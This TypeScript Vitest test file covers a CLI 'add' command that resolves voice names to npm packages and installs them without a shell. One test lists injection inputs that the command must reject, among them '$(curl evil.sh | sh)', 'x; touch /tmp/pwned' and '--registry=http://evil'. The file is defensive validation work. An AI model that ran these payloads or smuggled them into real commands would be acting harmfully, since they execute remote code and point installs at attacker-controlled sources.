import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const mocks = vi.hoisted(() => ({ spawnSync: vi.fn(), logError: vi.fn() }));
vi.mock("node:child_process", () => ({ spawnSync: mocks.spawnSync }));
vi.mock("../../src/logger.js", () => ({
  logger: { error: mocks.logError, warn: vi.fn(), info: vi.fn() },
}));

import { addCommand, resolvePackageName } from "../../src/commands/add.js";

const HINT =
  'Hint: use a voice name like "slack", a scoped package like "@acme/voice", or add a version like "@acme/voice@^1.2.0".';

describe("resolvePackageName", () => {
  it("resolves postgres to the official @tuttiai/postgres voice, not the pg driver", () => {
    expect(resolvePackageName("postgres")).toBe("@tuttiai/postgres");
  });

  it("resolves an unknown bare name to @tuttiai/<name>", () => {
    expect(resolvePackageName("foo")).toBe("@tuttiai/foo");
  });

  it("passes a scoped package name through unchanged", () => {
    expect(resolvePackageName("@acme/voice")).toBe("@acme/voice");
  });
});

describe("addCommand", () => {
  let dir: string;
  let consoleError: ReturnType<typeof vi.spyOn>;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "tutti-add-"));
    writeFileSync(join(dir, "package.json"), JSON.stringify({ dependencies: { "@tuttiai/core": "^1.0.0" } }));
    vi.spyOn(process, "cwd").mockReturnValue(dir);
    vi.spyOn(process, "exit").mockImplementation((code) => {
      throw new Error(`exit ${String(code)}`);
    });
    vi.spyOn(console, "log").mockImplementation(() => undefined);
    consoleError = vi.spyOn(console, "error").mockImplementation(() => undefined);
    mocks.spawnSync.mockReset();
    mocks.spawnSync.mockReturnValue({ status: 0, stdout: null });
    mocks.logError.mockReset();
  });

  afterEach(() => {
    vi.restoreAllMocks();
    rmSync(dir, { recursive: true, force: true });
  });

  it.each([
    ["slack", "@tuttiai/slack"],
    ["postgres", "@tuttiai/postgres"],
    ["foo", "@tuttiai/foo"],
    ["@acme/voice", "@acme/voice"],
    ["@tuttiai/slack@1.2.3", "@tuttiai/slack@1.2.3"],
    ["@tuttiai/slack@latest", "@tuttiai/slack@latest"],
    ["@acme/voice@^1.2.0", "@acme/voice@^1.2.0"],
    ["@acme/voice@~1.2", "@acme/voice@~1.2"],
  ])("installs %s as npm install %s without a shell", (input, spec) => {
    addCommand(input);

    expect(mocks.spawnSync).toHaveBeenCalledTimes(1);
    expect(mocks.spawnSync).toHaveBeenCalledWith(
      "npm",
      ["install", spec],
      expect.objectContaining({ cwd: dir, shell: false }),
    );
  });

  it("does not reinstall a package already in package.json, even with a version", () => {
    addCommand("@tuttiai/core@^2.0.0");
    expect(mocks.spawnSync).not.toHaveBeenCalled();
  });

  it.each([
    ["semicolon", "x; touch /tmp/pwned"],
    ["command substitution", "$(curl evil.sh | sh)"],
    ["backtick", "`id`"],
    ["scoped name with a semicolon", "@acme/voice; id"],
    ["npm option", "--registry=http://evil"],
  ])("rejects a name with a %s, exits 1 and runs nothing", (_label, input) => {
    expect(() => addCommand(input)).toThrow("exit 1");

    expect(mocks.spawnSync).not.toHaveBeenCalled();
    expect(mocks.logError).toHaveBeenCalledWith(`Invalid package name: ${JSON.stringify(input)}`);
    expect(consoleError).toHaveBeenCalledWith(expect.stringContaining(HINT));
  });

  it.each(["", "   "])("asks for a name when given %j and runs nothing", (input) => {
    expect(() => addCommand(input)).toThrow("exit 1");

    expect(mocks.spawnSync).not.toHaveBeenCalled();
    expect(mocks.logError).toHaveBeenCalledWith("Package name is required.");
    expect(consoleError).toHaveBeenCalledWith(expect.stringContaining(HINT));
  });

  it("exits 1 with the command and exit code when npm fails", () => {
    mocks.spawnSync.mockReturnValue({ status: 1, stdout: null });

    expect(() => addCommand("slack")).toThrow("exit 1");
    expect(mocks.logError).toHaveBeenCalledWith("npm install @tuttiai/slack failed (exit code 1).");
  });

  it("exits 1 with a PATH hint when npm cannot be found", () => {
    const error = Object.assign(new Error("spawnSync npm ENOENT"), { code: "ENOENT" });
    mocks.spawnSync.mockReturnValue({ status: null, stdout: null, error });

    expect(() => addCommand("slack")).toThrow("exit 1");
    expect(mocks.logError).toHaveBeenCalledWith(
      "Could not run npm. Is Node.js/npm installed and on your PATH?",
    );
  });

  it("exits 1 and runs nothing without a package.json", () => {
    rmSync(join(dir, "package.json"));

    expect(() => addCommand("slack")).toThrow("exit 1");
    expect(mocks.spawnSync).not.toHaveBeenCalled();
  });
});
